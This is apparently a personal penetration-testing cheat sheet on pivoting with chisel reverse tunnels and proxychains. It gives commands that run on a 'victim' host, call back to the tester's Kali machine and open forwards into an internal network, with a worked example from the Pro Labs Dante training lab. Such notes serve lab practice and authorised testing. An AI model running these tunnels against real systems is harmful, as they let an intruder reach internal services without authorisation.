
# View Internal Website
Must use chisel

proxychains:
```c
socks5 127.0.0.1 1080
```

```c
chisel server -p 9000 --reverse (kali chisel server)
```

```c
chisel client KALI_IP:9000 R:8000:127.0.0.1:8000 (client forwarding port 8000 to  kali, if different interal ip change the last 8000)
```

##### Chisel can be transferred over http, extremely useful for Linux and 

Windows devices:
-Basic Connection  
-On server (local or jumpbox)  
```c
chisel or ./chisel server -p <random> --reverse
```  
  
-On Victim  
```c
./chisel client <IP wanting to connect (AP or jumpbox)>:<server specified port> R:1080:socks (This 1080:socks command connects to the socks5 port in etc/proxychains.conf file)  
```
OR  
On Victim  
```c
-./chisel server -p <server_port> --reverse  
```
  
On AP  
```c
-./chisel client <server_host>:<server_port> R:<remote_host>:<remote_port>:<local_port> 
```
This syntax should allow me to view any internal websites through localhost:<remote_port specified>

Example Scenario in Pro Labs Dante:
My AP IP was 10.10.14.4, my first jumpbox (Web Server) was 10.10.110.100, and I wanted to access an internal connected machine at 172.16.1.12.
- On my AP
	- chisel server -p 1236 --reverse
- On my jumpbox
	- ./chisel client 10.10.14.4:1236 R:172.16.1.12:1234
- Back on my AP
	- In URL, you can visit that IP at http://localhost:1234
